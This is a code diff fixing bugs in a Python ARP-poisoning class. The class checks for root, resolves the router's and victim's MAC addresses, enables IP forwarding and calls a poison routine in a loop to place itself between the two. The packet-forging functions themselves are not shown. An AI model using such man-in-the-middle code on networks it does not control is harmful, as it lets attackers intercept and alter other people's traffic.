@@ -10,25 +10,25 @@ import logging
 import time
 
 class arpPoison: 
-    def __init__(self, routerIp, victimeIp):
+    def __init__(self, routerIp, victimIp):
         logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
         #sudo check 
         if os.geteuid() != 0:
             sys.exit("[!] Please run as root")
         self.routerIP = routerIp
         self.victimIP = victimIp
-        self.routerMAC = MAC_Original(args.routerIP)
-        self.victimMAC = MAC_Original(args.victimIP)
+        self.routerMAC = self.MAC_Original(self.routerIP)
+        self.victimMAC = self.MAC_Original(self.victimIP)
 
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
              ipf.write('1\n')
         def signal_handler(signal, frame):
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                 ipf.write('0\n')
-            restore()
+            self.restore()
         signal.signal(signal.SIGINT, signal_handler)
         while True:
-            poison()
+            self.poison()
             time.sleep(1.5)
 
 
